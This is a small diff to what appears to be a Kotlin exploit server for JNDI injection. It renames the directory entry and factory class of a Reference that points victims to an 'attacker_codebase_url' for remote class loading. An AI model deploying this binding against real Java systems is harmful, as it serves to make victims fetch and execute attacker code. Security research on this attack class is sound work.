@@ -76,8 +76,8 @@ fun main() {
     // Use `rebind` instead of `bind` if something was already there from a
     //  previous run
     ctx.rebind(
-        "cn=factory",
-        Reference("MadeClass", "Factory", attacker_codebase_url)
+        "cn=made-class",
+        Reference("MadeClass", "FactoryClass", attacker_codebase_url)
     )
 
     // For good measure
